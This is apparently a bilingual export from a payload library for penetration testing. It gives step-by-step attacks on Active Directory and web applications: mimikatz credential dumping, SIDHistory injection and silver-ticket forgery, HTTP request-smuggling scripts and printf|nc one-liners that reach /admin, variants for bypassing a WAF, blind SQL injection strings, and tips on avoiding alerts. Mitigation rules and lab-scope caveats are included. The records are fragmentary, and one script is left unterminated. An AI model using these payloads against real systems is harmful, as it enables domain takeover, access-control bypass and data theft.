description.en: Appends the domain-admin SID to svc_backup via DSInternals replication (the real cmdlet is Add-ADReplSidHistory; Add-ADSidHistory does not exist), using domain credentials with replication rights built by Get-Credential. Success: the target user's sIDHistory echoes the injected SID.

explanation.zh: DSInternals 复制通道注入 SID 历史
注入的域管组历史 SID

title.zh: DSInternals 复制通道参数差分变体

description.zh: sIDHistory 是 system-only 属性，ADSI/LDAP 直写会被目录以 unwilling-to-operate 拒绝，原 LDAP 直改写法判据不可达，改走 DSInternals DRS 复制通道；本条相对 V0 换目标账户 {LAB_USER} 并注入 -519 Enterprise Admins 历史 SID 验证权限扩散面。判据：Get-ADUser -Properties sIDHistory 回显注入的 SID。
description.en: sIDHistory is a system-only attribute, so raw ADSI/LDAP writes are refused by the directory and the old direct-write form could never land; this variant rides the DSInternals DRS replication channel and, unlike V0, targets {LAB_USER} with the -519 Enterprise Admins history SID to verify privilege spread. Success: Get-ADUser -Properties sIDHistory echoes the injected SID.

description.zh: 以完整 SID 字符串替代账户名解析注入域管组历史 SID；whoami /all 显示历史 SID 即成功。
description.en: Inject the full SID string instead of resolving an account name; whoami /all showing the historical SID confirms success.

title.zh: 向账户注入 SIDHistory 属性
title.en: Inject a SIDHistory attribute onto an account

description.zh: 用 mimikatz sid::add 为 backdoor_user 追加 administrator 的 SID 历史，使该账户继承其权限。
description.en: Uses mimikatz sid::add to append the administrator SID to backdoor_user's SIDHistory so the account inherits its privileges.

title.zh: 核对账户 SIDHistory 与令牌组
title.en: Inspect the account's SIDHistory and token groups

description.zh: 查询 backdoor_user 的 sidHistory 属性并以 whoami /all 对照当前令牌组，验证 SID 注入效果。
description.en: Queries backdoor_user's sidHistory attribute and compares it with whoami /all token groups to verify the SID injection.

description.zh: 读取目标账户的 sIDHistory 属性并列出账户名，识别超出授权基线的 SID 附加项。
description.en: Reads the target account's sIDHistory attribute and lists account names to identify SID additions beyond the authorization baseline.

name.zh: 白银票据前置条件与检测审计

description.zh: 验证服务密钥已知前提下的白银票据伪造面，评估不经过 KDC 的访问风险。
description.en: Forges a service ticket with a known service-account NTLM hash and presents it directly to the service while bypassing the KDC, then verifies which PAC-signature and ticket-validation controls detect the forgery.

overview.zh: 白银票据前置条件与检测审计覆盖服务票据伪造场景：针对已获取目标服务账号 NTLM 哈希的测试主体，验证能否为特定 SPN 伪造服务票据并绕过 KDC。验证维度涵盖内存凭据提取、CIFS 服务票据伪造注入与服务类型映射扩展三个步骤。
overview.en: Silver-Ticket Preconditions and Detection Audit covers service-ticket forgery: for a test principal holding the target service account's NTLM hash, verify whether tickets for specific SPNs can be forged while bypassing the KDC. Verification dimensions span in-memory credential extraction, CIFS ticket forgery and injection, and service-type mapping expansion.

vulnerability.zh: 根因是服务票据由服务账号自身密码加密，KDC 不参与签发后的校验；拿到服务账号（含机器账户）NTLM 哈希的攻击者可伪造任意用户身份的服务票据，服务端缺少 PAC 签名校验时该票据直接生效。
vulnerability.en: The root cause is that service tickets are encrypted with the service account's own password and the KDC plays no role in post-issuance validation; an attacker holding the NTLM hash of a service account (including machine accounts) can forge service tickets as any user, and without server-side PAC signature checks such tickets take effect directly.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 sekurlsa::logonpasswords 提取内存凭据，获得目标服务账号 NTLM 哈希；第 2 步用 kerberos::golden 指定 /target 目标主机、/service:cifs 与该哈希伪造服务票据并 /ptt 注入，klist 显示 cifs 票据且可访问目标共享即确认成功；第 3 步按 CIFS/HTTP/LDAP/MSSQLSvc/HOST 映射扩展到其他服务类型，对每个 SPN 复用同一方法。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 extracts in-memory credentials with sekurlsa::logonpasswords to obtain the target service account's NTLM hash; step 2 forges a service ticket with kerberos::golden specifying /target, /service:cifs, and that hash, injects via /ptt — klist showing the cifs ticket plus target share access confirms success; step 3 extends to other service types via the CIFS/HTTP/LDAP/MSSQLSvc/HOST mapping, reusing the same method per SPN. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
定期轮换服务账号与机器账户密码使伪造密钥失效，敏感服务启用 PAC 签名校验，关联比对登录事件与 4769 签发记录：
    Set-ADAccountPassword svc_sql -Reset -NewPassword (ConvertTo-SecureString -AsPlainText '<随机强口令>' -Force)
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Pac" /v RelyOnCompat /t REG_DWORD /d 0 /f
mitigation.en: Rotate service account and machine account passwords regularly to invalidate forgery keys, and enable PAC signature validation for sensitive services; monitor service-ticket requests with no matching TGT session (missing 4768/4769 pairing at the KDC). After the fix, forged tickets must fail server-side PAC validation.

description.zh: 运行 sekurlsa::logonpasswords 抓取内存凭据；目标服务账号的 NTLM 哈希即白银票据原料，无需触及 krbtgt。
description.en: Run sekurlsa::logonpasswords; the service account's NTLM hash from memory is the silver ticket ingredient, no krbtgt needed.

description.zh: 用 kerberos::golden /target:服务主机 /service:cifs /rc4:哈希 铸银票并注入；klist 出现对应服务 TGS 即伪造成功。
description.en: Forge the silver ticket with kerberos::golden /target /service:cifs /rc4 and inject; the matching TGS in klist confirms the forgery.

description.zh: 按 CIFS、HOST、HTTP、MSSQLSvc 等 SPN 清单换 service 参数重铸；覆盖越多服务即可控越多文件、Web 与数据库资源。
description.en: Re-forge per the CIFS/HOST/HTTP/MSSQLSvc SPN list; each covered service adds control over files, web apps and databases.

name.zh: CL.CL 请求走私

description.zh: 验证前后端对重复 Content-Length 请求的处理是否一致，防止 CL.CL 解析分歧被用于请求走私。
description.en: Verifies that the front end and back end consistently reject requests with duplicate Content-Length headers, preventing CL.CL parsing divergence from being used for request smuggling.

overview.zh: 该 Payload 覆盖重复 Content-Length 的拒绝与回归场景，检验代理链是否按 RFC 一致拒绝歧义报文，防止 CL.CL 分歧演化为走私。验证维度含重复 CL 原始请求、双消息边界与持久连接样例，对应第 1 至第 3 步。
overview.en: This payload covers duplicate Content-Length rejection regression, testing whether the proxy chain uniformly rejects ambiguous messages per RFC so CL.CL divergence cannot evolve into smuggling. Validation covers a raw duplicate-CL request, a dual-message boundary, and a keep-alive sample, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对重复 Content-Length 的仲裁规则不一致：一端取首值另一端取末值或直接放行，消息边界随之错位，剩余字节被解析为独立请求。
vulnerability.en: The root cause is inconsistent arbitration of duplicate Content-Length values between front and back ends: one takes the first value, another the last or accepts outright, shifting message boundaries so leftover bytes parse as an independent request.

exploitation.zh: 第 1 步用 printf 构造携带两个不同 CL 值的原始 POST 并以套接字发送到授权 echo 路径，前后端都应返回 400；第 2 步发送双消息边界样例，按两跳日志的请求计数判断第二请求是否出现；第 3 步在 keep-alive 连接上重复验证持久连接行为。任一后端执行第二条请求即确认拒绝缺失。占位符在全局变量菜单替换。
exploitation.en: In step 1, build a raw POST with two different CL values via printf and socket it to the authorized echo path; both ends should return 400. In step 2, send the dual-message boundary sample and judge second-request appearance from hop-log request counts. In step 3, repeat on a keep-alive connection for persistence behavior. Any backend executing the second request confirms missing rejection. Replace placeholders via the global variables menu.

mitigation.zh:
所有层级对重复或冲突的 Content-Length 一律 400 并断开连接，网关在入口完成仲裁与规范化；链路统一使用 HTTP/2 消除分帧歧义。
    # ModSecurity：重复 Content-Length 直接拒绝
    SecRule &REQUEST_HEADERS:Content-Length "@gt 1" \
        "id:1010,phase:1,deny,status:400,msg:'duplicate Content-Length'"
    listen 443 ssl http2;   # 前后端统一 h2，报文不再歧义定界
mitigation.en: Every layer must return 400 and close on duplicate or conflicting Content-Length, with the gateway normalizing at ingress. After the fix, replay steps 1 through 3: ambiguous messages should all be rejected and hop counts agree.

title.zh: 发送重复 Content-Length 探测

description.zh: 用原始 TCP 向 echo 路径发送两个不同 Content-Length 的 POST；RFC 要求直接拒绝该类报文，若出现正常响应或单值被采纳即锁定前后端对 CL 仲裁的分歧。
description.en: Send a raw TCP POST carrying two different Content-Length values to the echo path; RFC mandates rejection, so any normal response or silent adoption of one value exposes the parsers' disagreement.

description.zh: 把第二个完整请求写进正文并声明冲突的 CL 值，使两端对正文归属判断不一致；两跳请求计数出现分歧或第二请求被独立处理即走私成功。
description.en: Place a second full request in the body with conflicting CL values so the two hops disagree on body ownership; diverging request counts or independent handling of the second request confirm smuggling.

title.zh: 持久连接验证稳定利用

description.zh: 在 keep-alive 连接上重发第 2 步的双请求结构，走私请求在连接复用时仍被后端独立解析；代理与后端日志请求数不一致即确认可稳定利用。
description.en: Replay the step-2 dual-request structure over a keep-alive connection; if the smuggled request is still parsed independently and proxy/backend log counts diverge, the primitive is stably exploitable.

description.zh: 经 HTTP/2 降级以 content-length:0 携带正文发送；h2 分帧与 HTTP/1.1 的 CL 仲裁不一致使走私消息到达后端，即绕过前端对重复 CL 头的严格拦截。
description.en: Downgrade through HTTP/2 sending a body alongside content-length:0; the mismatch between h2 framing and HTTP/1.1 CL arbitration lets the smuggled message reach the backend past strict CL filtering.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 HTTP 重复 Content-Length 拒绝回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for HTTP Duplicate Content-Length Rejection Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: HTTP 重复 Content-Length 拒绝回归只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: HTTP Duplicate Content-Length Rejection Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 重复 Content-Length 会触发中间件告警——串行单发并在每发后核对队列状态；不对生产链路发送。
opsecTips.en: Duplicate Content-Length trips middleware alerts — send serially one at a time, check queue state between attempts, and never target production chains.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 保留 HTTP/2 到 HTTP/1.1 降级前提，但只使用实验 echo 路径和固定正文；必须由网关与后端日志证明降级后的边界差异。
description.en: Retain the HTTP/2-to-HTTP/1.1 downgrade prerequisite while using only a lab echo path and fixed body. Gateway and backend logs must prove a post-downgrade boundary difference.

title.zh: 不同 CL 值持久连接变体

description.zh: 保留两个不同 Content-Length 与后续请求结构，改用授权 echo 路径；单次响应状态不能证明走私，需比较两跳解析日志。
description.en: Retain two differing Content-Length values and the following-request structure on authorized echo paths. One response status cannot prove smuggling; compare parsing logs at both hops.

title.zh: CL 头部空白解析变体

description.zh: 保留冒号前空白的解析差异样例并替换内部管理目标；只在授权多级代理 echo 链中验证各跳是否一致拒绝。
description.en: Retain the pre-colon whitespace parsing variant while replacing internal administrative targets. Validate only in an authorized multi-hop echo chain that every hop rejects it consistently.

title.zh: 重复 Content-Length 原始请求

description.zh: 命令以原始 TCP（nc）发送，避免 curl 等客户端改写报文，且只请求授权实验 echo 路径；按 RFC 9112，前后端都应拒绝携带不同 Content-Length 的请求。
description.en: Use a raw TCP request instead of curl, which may rewrite the message, and target only an authorized lab echo path. RFC 9112 expects both hops to reject differing Content-Length values.

description.zh: 保留完整双请求边界样例，但把管理路径与通用目标替换为单用户授权 echo 夹具；只依据两跳请求计数和日志判定。
description.en: Retain a complete dual-request boundary sample while replacing administrative and generic targets with a single-user authorized echo fixture. Judge only by request counts and logs at both hops.

title.zh: CL-CL 持久连接边界样例

description.zh: 保留持久连接上的第二请求结构，但只命中授权 echo 路径，不再演示 ACL 绕过；阳性要求代理与后端日志证明请求数量分歧。
description.en: Retain the second-request structure on a persistent connection while targeting only an authorized echo path rather than demonstrating an ACL bypass. A positive result requires proxy and backend logs proving a request-count disagreement.

name.zh: CL.TE 请求走私

description.zh: 覆盖 CL.TE 请求走私基础形态：前端信任 Content-Length、后端信任 Transfer-Encoding 时注入第二请求边界，验证队列错位与请求偷渡。
description.en: Covers core CL.TE request smuggling: inject a second request boundary when the front-end trusts Content-Length and the back-end trusts Transfer-Encoding, verifying queue desync.

subCategory.zh: CL.TE 与 TE.CL 经典分歧

overview.zh: 该 Payload 覆盖 HTTP 请求走私的消息边界分歧场景，检验代理链对 Content-Length 与 Transfer-Encoding 的分帧取舍是否一致。验证维度含 CL-TE、TE-CL 基础形态与重复 TE 头的 TE-TE 混淆，对应第 1 至第 3 步。
overview.en: This payload covers HTTP request-smuggling message-boundary divergence, testing whether the proxy chain frames messages consistently between Content-Length and Transfer-Encoding. Validation covers basic CL-TE and TE-CL forms plus duplicate-TE TE.TE confusion, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对同一报文选择不同的消息定界标准：一端按 Content-Length、另一端按 chunked 结束，多余字节被并入后续请求，攻击者借此把任意请求走私进内网。
vulnerability.en: The root cause is front and back ends choosing different framing standards for the same message: one delimits by Content-Length while the other honors chunked framing, so leftover bytes merge into the next request and attackers can smuggle arbitrary requests into the internal network.

exploitation.zh: 第 1 步发送 CL 与 TE 并存的原始请求，SMUGGLED 被解析为下一条请求或出现超时差异即确认 CL-TE；第 2 步交换定界方向构造 TE-CL 请求，剩余分帧进入第二条请求即确认；第 3 步发送重复 TE 头，两端仲裁不一致即确认 TE-TE。用原始套接字发送避免客户端改写。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, send the raw CL-plus-TE message; SMUGGLED parsed as the next request or a timeout difference confirms CL-TE. In step 2, flip framing to TE-CL; leftover chunks entering the second request confirm it. In step 3, send duplicate TE headers; inconsistent arbitration confirms TE-TE. Send via raw sockets to avoid client rewriting. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.en: Gateways must reject CL-plus-TE coexistence and duplicate TE headers, unify framing standards across the chain, refuse ambiguous messages, and keep parser implementations aligned. After the fix, replay steps 1 through 3: ambiguous requests should get 400 and hop request counts must agree.

title.zh: 探测 CL-TE 分帧差异

description.zh: 发送 CL 与 TE 并存的请求，前端按 Content-Length 截断而后端按 chunked 提前结束；出现超时差异或 SMUGGLED 标记出现在下一个响应里，即确认走私条件成立。
description.en: Send a request carrying both Content-Length and Transfer-Encoding; if the frontend truncates by CL while the backend ends early by chunked framing, timeouts or a SMUGGLED marker in the next response confirm the smuggling condition.

attackChain.payload:
printf 'POST / HTTP/1.1
Host: {TARGET}
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED' | nc {TARGET} 80
printf 'POST / HTTP/1.1
Host: {TARGET}
Content-Length: 13
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

0

SMUGGLED' | nc {TARGET} 80

title.zh: 验证 TE-CL 反向走私

description.zh: 交换分帧优先级发送 TE-CL 请求，后端按 Content-Length 只取正文前三字节，剩余数据进入下一请求解析；走私标记被独立处理即与第 1 步互补，确认双向可利用。
description.en: Flip the framing priority with a TE-CL request where the backend keeps only the first bytes by Content-Length; the leftover framing becomes the next request, confirming the reverse direction is exploitable.

attackChain.payload:
POST / HTTP/1.1
Host: {TARGET}
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

title.zh: 双 TE 头混淆绕过仲裁
title.en: Confuse arbitration with duplicate TE headers

description.zh: 发送重复 Transfer-Encoding 请求制造前后端取值分歧，使 SMUGGLED 被解析为独立消息；走私内容到达后端即确认双 TE 混淆是继前两步之后的第三条可用通道。
description.en: Send duplicate Transfer-Encoding headers to split the two parsers' arbitration so SMUGGLED is parsed as its own message; the smuggled content reaching the backend confirms the TE-TE channel.

attackChain.payload:
POST / HTTP/1.1
Host: {TARGET}
Transfer-Encoding: chunked

0

SMUGGLED

title.en: Expand bypass surface with parsing variants

description.zh: 用头名后加空格、xchunked 拼写、双 TE 取值等解析变体批量重试第 3 步载荷；任一变体仍让走私标记抵达后端即绕过前端对 Transfer-Encoding 的规范化检查。
description.en: Retry the step-3 payload with variants such as a space after the header name, xchunked spellings and duplicate values; any variant that still reaches the backend bypasses Transfer-Encoding normalization.

description.zh: 第一个请求同时携带 Content-Length 与 Transfer-Encoding，其分帧终止块附加注入扩展并以 G 标记字节检验后端是否按 chunked 提前截断请求体；后续请求用于观察走私消息的边界。

description.zh: 绕过大小写敏感的 TE 头规则。判据：SMUGGLED 进入下一请求队列。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。
description.en: Case-sensitive TE rules bypassed. Success: SMUGGLED joins the next request. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules.

description.zh: 冒号后用 TAB 替代空格改变头部指纹。判据：走私成功。

description.en: Differently-cased CL headers get picked independently. Success: backend consumes the smuggled bytes.

description.zh: 原命令与 execution 逐字相同且为裸换行报文，无法直接投递。本变体改为 printf 管道经 nc 发送的完整可执行形态（CL 在前 TE 在后的经典差分），第二行追加重复 TE 头（xchunked + chunked），命中取首值/取末值/合并解析的前端差分。成功判据：SMUGGLED 滞留后端队列，或下一请求异常/显著超时。
description.en: The original newline-literal duplicated the execution sample and cannot be delivered as-is. Rewritten as complete printf-to-nc one-liners for the classic CL-before-TE differential; the second line duplicates the TE header (xchunked then chunked) to split frontends that take the first, last, or merged value. Success: SMUGGLED lingers on the backend queue or the next request stalls.

explanation.zh: printf 还原 CRLF 报文经 nc 原样投递
explanation.en: printf renders the CRLF raw request for byte-exact nc delivery

explanation.en: duplicated TE values split parsers taking first, last, or merged

description.en: Trailing G corrupts the next request method. Success: next request gets a 400.

description.zh: 挂起连接等待超时判断后端分帧状态。判据：显著超时差异表明可走私。
description.en: Timeout delta reveals backend framing state. Success: marked timing difference indicates smuggle potential.

description.en: Oversized CL swallows the next real request headers. Success: victim response cross-contaminated.

description.zh: Host 头大写触发前后端路由分歧。判据：404/400 差异暴露解析分层。
description.en: Uppercase Host splits routing between layers. Success: 404/400 delta reveals the layers.

description.en: This multiline value is one raw-request construction fragment. Complete its request line and CRLF framing for the target in an isolated connection; do not send lines independently.

description.zh: 绕过 Transfer-Encoding: 精确匹配：冒号前插空格，部分前端拒绝而后端接受。判据：SMUGGLED 被第二个请求处理。
description.en: Space before colon breaks front-end parsing while the backend accepts it. Success: SMUGGLED processed as a later request.

description.zh: 利用 obs-fold 续行把 chunked 值折到下一行绕过头部规则。判据：G 前缀滞留后端队列污染下一请求方法（如 GGET）返回 400，即证明该变体走私生效。失效条件：obs-fold 续行已被 RFC 9112 弃用、现代栈拒收，仅宽容实现成立。

description.zh: 终止块附加扩展改变特征。判据：走私内容被缓存或反映。
description.en: Extension on the zero chunk alters the signature. Success: smuggled content reflected.

description.zh: 仅 LF 行尾被宽容后端接受导致前后端分帧差异。判据：响应异常或走私生效。
description.en: LF-only line endings accepted by lenient backends create a framing split. Success: abnormal response or smuggle confirmed.

description.zh: 三条独立可执行报文：逗号多值 TE 命中"取首段/整体拒收"解析差分；同大小写双 Content-Length 命中首值/尾值选择差分；TE 值内嵌 NUL 仅被宽容解析层接受。NUL 形失效条件：现代服务器对头部 NUL 直接返回 400。成功判据：SMUGGLED 滞留后端队列（下一请求异常或显著超时），或目标 400/拒收行为佐证解析差分。
description.en: Three independent executable messages: a comma-separated TE list hits the split-first versus reject-whole parsing differential; a same-case dual Content-Length hits the first-value versus last-value selection; an embedded NUL inside the TE value survives only in lenient parsers. Failure condition for the NUL form: modern servers answer 400 outright to NUL bytes in headers. Success: SMUGGLED stays queued on the backend (the next request misbehaves or times out), or the 400/rejection behavior confirms the parsing differential.

description.en: When the front end blocks the plaintext path /admin but the backend trusts override headers, the smuggled GET / decouples the ACL from routing, and X-Original-URL plus X-Rewrite-URL restore the request to /admin on the backend side. The Content-Length of 91 is computed over the literal placeholder text so the smuggled segment arrives intact. Success: the response carries admin content instead of 403.

name.zh: TE.CL 请求走私

description.zh: 覆盖 TE-CL 走私形态验证：从前端分帧计时探测，到后端按 Content-Length 截断的走私请求与大 CL 吞噬请求头样例，并附 TE 头空白与 chunk 长度行变体清单，用于确认前后端分帧不一致的利用深度。
description.en: Covers TE-CL smuggling form validation: from front-end framing timing probes through back-end Content-Length truncation smuggled requests and large-CL header-swallowing samples, with TE-header whitespace and chunk-length line variant lists, confirming exploitation depth of front/back framing inconsistency.

subCategory.zh: CL.TE 与 TE.CL 经典分歧

overview.zh: 该 Payload 覆盖 TE-CL 消息边界分歧场景，检验前端按 chunked 转发而后端按 Content-Length 截断时的走私条件与利用深度。验证维度含计时探测、截断走私与大 CL 吞噬请求头三步，对应第 1 至第 3 步。
overview.en: This payload covers TE-CL message-boundary divergence, testing smuggling conditions and exploit depth when the front end forwards chunked while the back end truncates by Content-Length. Validation covers timing probing, truncation smuggling, and large-CL header capture, mapped to steps 1 through 3.

vulnerability.zh: 根因在于前后端对同一请求选择不同的定界头：前端信任 Transfer-Encoding、后端信任 Content-Length，多余分帧数据被并入下一条请求，攻击者可借此劫持他人请求头。
vulnerability.en: The root cause is front and back ends picking different delimiting headers for one request: the front end trusts Transfer-Encoding while the back end trusts Content-Length, so leftover framed data merges into the next request and attackers can capture other users' headers.

exploitation.zh: 第 1 步先用 curl 发送同时带 TE 与 CL 的 chunked 请求，再用原始套接字发送仅以终止块结尾的请求并测量响应时间，超时特征即指示分帧分歧；第 2 步构造后端按 CL 截断的报文使剩余字节成为独立请求；第 3 步声明超大 CL 把下一位用户的请求头并入参数验证劫持。占位符在全局变量菜单替换；变体参考 wafBypass。
exploitation.en: In step 1, first send a chunked request with both TE and CL via curl, then a raw-socket request ending only with the terminator chunk, timing responses; timeout signatures indicate framing divergence. In step 2, craft the backend truncating by CL so leftover bytes become an independent request. In step 3, declare an oversized CL folding the next user's headers into a parameter to prove hijack. Replace placeholders via the global variables menu; see wafBypass for variants.

mitigation.zh:
禁止同一请求同时携带 Content-Length 与 Transfer-Encoding，链路统一定界标准，出现双头即 400 断开，并监控响应时间异常。
    SecRule &REQUEST_HEADERS:Transfer-Encoding "@eq 1" \
        "id:1011,phase:1,deny,status:400,chain,msg:'CL+TE smuggling'"
      SecRule &REQUEST_HEADERS:Content-Length "@ge 1"
mitigation.en: Forbid CL and TE on the same request, unify framing standards across the chain, return 400 on ambiguity, and monitor response-time anomalies. After the fix, replay steps 1 through 3: probing shows no timeout divergence and smuggled messages are rejected.

description.zh: 先用 curl 携带 TE 与 CL 头发送 chunked 请求，再用原始套接字发送仅以单个 0 终止块结束的请求并测量响应时间；连接挂起或超时差异即暴露后端仍在等待更多字节。
description.en: First send a chunked request with both TE and CL via curl, then a raw socket request ending with a lone zero terminator while timing responses; hangs or timeout deltas reveal the backend waiting for more bytes.

attackChain.payload:
python3 - <<'PY'
import socket


def te_cl_smuggle(host, port):
    smuggled = "GET /admin HTTP/1.1\nHost: {}\n".format(host)
    payload = (
        "POST / HTTP/1.1\n"
        "Host: {}\n"
        "Content-Length: 4\n"
        "Transfer-Encoding: chunked\n"
        "\n"
        "{}\n"
        "{}"
        "0\n"
    ).format(host, format(len(smuggled), "x"), smuggled)
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()

name.zh: TE.TE 请求走私

description.zh: 覆盖重复 Transfer-Encoding 头的混淆与走私验证：从重复 TE 头变体批量探测，到双 TE 头走私 GET 请求与缓存投毒样例，并附取值组合与控制字符注入清单，用于确认重复头场景的解析歧义。
description.en: Covers obfuscation and smuggling validation of duplicate Transfer-Encoding headers: from bulk probing of duplicate-TE variants through double-TE smuggled GET requests and cache-poisoning samples, with value-combination and control-character injection lists, confirming parsing ambiguity under duplicate headers.

overview.zh: 该 Payload 覆盖重复 Transfer-Encoding 头的解析歧义场景，检验链路对多值与变体写法的仲裁差异及其走私与缓存影响。验证维度含 TE 变体批量探测、双 TE 走私与走私缓存投毒三步，对应第 1 至第 3 步。
overview.en: This payload covers parsing ambiguity of duplicate Transfer-Encoding headers, testing how the chain arbitrates multi-value and variant spellings and the smuggling and caching impact. Validation covers batch TE-variant probing, dual-TE smuggling, and smuggled cache poisoning, mapped to steps 1 through 3.

vulnerability.zh: 根因在于链路组件对重复 TE 头的首值、末值或合并策略不同：大小写、空白与控制字符变体进一步放大分歧，攻击者据此投递走私请求并污染共享缓存。
vulnerability.en: The root cause is chain components differing on first-value, last-value or merge strategies for duplicate TE headers: case, whitespace and control-character variants widen the divergence, letting attackers deliver smuggled requests and poison shared caches.

exploitation.zh: 第 1 步按脚本对八种 TE 混淆写法逐一生成请求并记录状态行，识别哪一端接受了非法变体；第 2 步以重复 TE 头（chunked 与非法值）构造走私报文，把目标 GET 请求送入后端；第 3 步把走私目标换成静态资源路径，检验走私响应是否被缓存绑定到共享键。占位符在全局变量菜单替换；变体参考 wafBypass 的取值组合与控制字符清单。
exploitation.en: In step 1, generate requests for eight TE obfuscation spellings one by one per the script and record status lines to identify which end accepts illegal variants. In step 2, build a smuggled message with duplicate TE headers (chunked plus an illegal value) delivering a chosen GET into the back end. In step 3, switch the smuggled target to a static-resource path and check whether the smuggled response binds to the shared cache key. Replace placeholders via the global variables menu; see wafBypass value-combination and control-character lists for variants.

mitigation.zh:
拒绝重复 Transfer-Encoding 头、非 chunked 取值以及头名前后空白与 obs-fold 折叠变体，CDN 与源站同步同一解析策略。
    SecRule &REQUEST_HEADERS:Transfer-Encoding "@gt 1" \
        "id:1012,phase:1,deny,status:400,msg:'duplicate TE'"
    SecRule REQUEST_HEADERS:Transfer-Encoding "!@streq chunked" \
        "id:1013,phase:1,deny,status:400,msg:'non-chunked TE'"
mitigation.en: Reject duplicate TE headers and any non-chunked value, return 400 on surrounding whitespace or control characters in header names, and sync parsing policy between CDN and origin. After the fix, replay steps 1 through 3: every variant should be rejected and the cache stays clean.

analysis.en: HTTP Duplicate Transfer-Encoding Regression is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 重复 Transfer-Encoding 变体批量探测会触发解析器告警——按变体清单分批并在批间核对基线。
opsecTips.en: Duplicate-TE variant sweeps trip parser alerts — batch by the variant list and re-check the baseline between batches.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: 双 TE 头走私 GET 请求样例

execution.command:
python3 - <<'PY'
import socket


def te_te_smuggle(host, port, te_header):
    smuggled = "GET /admin HTTP/1.1\nHost: {}\n".format(host)
    payload = (
        "POST / HTTP/1.1\n"
        "Host: {}\n"
        "Content-Length: {}\n"
        "{}\n"
        "\n"
        "0\n"
        "\n"
        "{}"
    ).format(
        host,
        len("0\n" + smuggled),
        te_header,
        smuggled
    )
    s = socket.socket()
    s.connect((host, port))
    s.send(payload.encode())
    resp = s.recv(4096)
    print(resp.decode(errors="ignore")[:500])
    s.close()


te_te_smuggle("{TARGET}", 80, "Transfer-Encoding: chunked\nTransfer-encoding: cow")
PY

description.zh: 以重复 Transfer-Encoding 头（chunked 与 cow）触发前后端解析分歧，把 GET /admin 请求走私到后端，验证双 TE 混淆的可达性。
description.en: Triggers front-end versus back-end disagreement with duplicate Transfer-Encoding headers (chunked and cow), smuggling a GET /admin request to the back end to confirm dual-TE obfuscation reachability.

name.zh: 固定 Marker 布尔盲注差分

description.zh: 成对提交真/假条件并携带唯一 Marker，以响应内容或长度差确认输入被拼入 SQL 查询；记录两侧完整证据再下结论。
description.en: Submits paired true/false conditions carrying a unique marker and compares response content or length differentials, confirming input reaches the SQL query and establishing the per-bit oracle used for extraction when error output is suppressed.

overview.zh: 覆盖布尔盲注的响应差分验证：以恒真/恒假条件与 marker 长度、ASCII 位判断构造真假请求，通过页面差异逐位提取数据。适用于 UNION 回显不可用、但注入条件能改变响应内容的场景。
overview.en: Covers boolean blind injection via response differential: crafting true/false requests with always-true/false conditions plus marker-length and ASCII-bit checks, extracting data bit by bit from page differences. Suitable when UNION echo is unavailable but injected conditions still change the response.

vulnerability.zh: 根因是注入点可控查询条件而应用不回显数据，攻击者以真/假条件制造响应差异作为逐位判定的 oracle；缺少参数化绑定时任何可观测差异都会被转化为数据提取通道。
vulnerability.en: The root cause is an injection point controlling query conditions while the application does not echo data: attackers turn true/false response differences into a bit-level oracle. Without parameterized binding, any observable difference becomes a data-extraction channel.

exploitation.zh: 用第 1 步主验证命令先提交恒真/恒假条件建立响应基线，再注入 marker 长度与 ASCII 位判断条件；真条件返回正常页、假条件返回差异页即可逐位提取数据。每轮只改变一个条件并记录响应差异，命中后按位推进直到提取完整目标值。
exploitation.en: Use the step 1 main verification command to establish a response baseline with always-true/false conditions, then inject marker-length and ASCII-bit checks; the true condition returning the normal page and the false condition returning a differing page enables bit-by-bit extraction. Change one condition per round, record response differences, and advance bit by bit until the target value is complete.

mitigation.en: Eliminate condition injection with parameterized queries and unify response templates across true/false business paths to compress differential signals. After the fix, replaying always-true/false payloads must produce no difference, with anomalous condition requests alerting in monitoring.

title.zh: 真假条件差分确认盲注
title.en: Confirm blind injection via differential responses

description.zh: 分别提交 1=1 与 1=2 条件，两次响应存在稳定可分差异即存在布尔盲注，无回显也能据此推断查询结果内容。
description.en: Submit 1=1 versus 1=2 conditions; a stable, repeatable difference marks boolean blind injection usable to infer query results.

' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>96-- -
' AND ASCII(SUBSTRING('PAYLOADER_MARKER',1,1))>112-- -
